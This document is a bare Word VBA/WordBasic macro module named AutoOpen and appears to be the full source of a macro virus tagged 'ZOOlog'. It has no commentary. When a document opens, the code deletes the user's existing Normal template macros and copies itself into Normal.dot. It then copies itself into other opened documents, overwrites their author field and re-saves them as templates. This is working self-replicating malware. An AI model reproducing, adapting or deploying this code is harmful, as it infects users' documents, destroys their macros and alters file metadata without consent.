   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim normal_
   Dim count_
   Dim name_$
   Dim IDChekit$
   On Error GoTo -1: On Error GoTo Crash
   normal_ = WordBasic.CountMacros(0)
   If normal_ < 1 Then GoTo SaveMacNorm
   If normal_ = 1 Then GoTo ID
   For count_ = 1 To normal_
       name_$ = WordBasic.[MacroName$](count_, 0)
       WordBasic.ToolsMacro Name:=name_$, Delete:=1
   Next count_
   ID:
   IDChekit$ = WordBasic.[GetProfileString$]("", IDZoo$)
   If IDChekit$ = MyName$ Then GoTo SaveFileMac
               WordBasic.ToolsMacro Name:=Final$, Delete:=1
   SaveMacNorm:
   WordBasic.MacroCopy ThisFileDot$ + Final$, Normal$ + Final$
   WordBasic.SetProfileString "", "beep", MyName$
   GoTo EndProg
   SaveFileMac:
   If WhoAuthor$ = MyName$ Then GoTo EndProg
   Rem FileSaveAs .Name = ThisFile$, .Format = 1
   WordBasic.MacroCopy Normal$ + Final$, ThisFileDot$ + Final$
   IAuthor
   WordBasic.FileSaveAs Name:=ThisFile$, Format:=1
   GoTo EndProg
   Crash:
   WordBasic.MsgBox "Error"
   EndProg:
   End Sub
   Private Function MyName$()
       MyName$ = "ZOOlog"
   End Function
   Private Function IDZoo$()
       IDZoo$ = "beep"
   End Function
   Private Function DotDir$()
       DotDir$ = WordBasic.[DefaultDir$](15) + "\"
   End Function
   Private Function Normal$()
       Normal$ = DotDir$ + "normal" + ":"
   End Function
   Private Function Final$()
       Final$ = "AutoOpen"
   End Function
   Private Function ThisFileDot$()
       ThisFileDot$ = WordBasic.[FileName$]() + ":"
   End Function
   Private Function ThisFile$()
       ThisFile$ = WordBasic.[FileName$]()
   End Function
   Private Function WhoAuthor$()
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
   WordBasic.CurValues.FileSummaryInfo dlg
   WhoAuthor$ = dlg.Author
   End Function
   Private Sub IAuthor()
   WordBasic.FileSummaryInfo Author:=MyName$
   End Sub
